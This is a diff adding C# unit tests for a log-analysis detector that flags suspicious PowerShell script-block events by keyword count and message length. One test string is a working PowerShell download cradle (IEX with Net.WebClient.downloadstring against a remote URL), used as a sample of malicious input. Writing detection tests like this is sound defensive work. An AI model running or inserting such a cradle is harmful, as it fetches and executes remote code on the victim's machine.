@@ -58,6 +58,35 @@ public class EventDetectorTests
         Assert.True(peak.Bits > 6, $"a 30x rate spike should be surprising: {peak.Bits}");
     }
 
+    // --- ContentSignals + ContentDetector ---
+
+    [Fact]
+    public void ContentSignalsCountsKeywordsAndLength()
+    {
+        const string cradle = "IEX (New-Object Net.WebClient).downloadstring('http://squirreldirectory.com/a')";
+        Assert.True(ContentSignals.BadWordCount(cradle) >= 3);          // iex, new... net.webclient, downloadstring
+        Assert.Equal(cradle.Length, ContentSignals.MsgLength(cradle));
+        Assert.Equal(0, ContentSignals.BadWordCount("An account was successfully logged on"));
+        Assert.Equal(0, ContentSignals.BadWordCount(null));
+    }
+
+    [Fact]
+    public void ContentDetectorFlagsKeywordsAndLengthOutliers()
+    {
+        // Baseline 4104 script-block records are short and benign; the target adds a long download-cradle 4104.
+        var baseline = Enumerable.Range(0, 100).Select(i => Script(i, len: 60, badWords: 0)).ToArray();
+        var target = Enumerable.Range(0, 20).Select(i => Script(i, len: 60, badWords: 0))
+            .Append(Script(20, len: 800, badWords: 4))                   // the malicious cradle
+            .ToArray();
+
+        var findings = new ContentDetector().Detect(baseline, target).ToArray();
+
+        var hit = Assert.Single(findings);
+        Assert.Equal(20, hit.EventIndex);
+        Assert.Contains("suspicious keyword", hit.Reason);
+        Assert.Contains("message length", hit.Reason);
+    }
+
     // --- DetectorEnsemble + triage recall ---
 
     [Fact]
@@ -87,4 +116,6 @@ public class EventDetectorTests
     const long Sec = 1_000_000;   // microseconds per second
     private static CanonicalEvent Evtx(long ts, int id) =>
         new() { Ts = ts, DataType = "windows:evtx:record", Source = SourceClass.EventLog, EventId = id };
+    private static CanonicalEvent Script(long ts, int len, int badWords) =>
+        new() { Ts = ts, DataType = "windows:evtx:record", Source = SourceClass.EventLog, EventId = 4104, MsgLength = len, BadWordCount = badWords };
 }
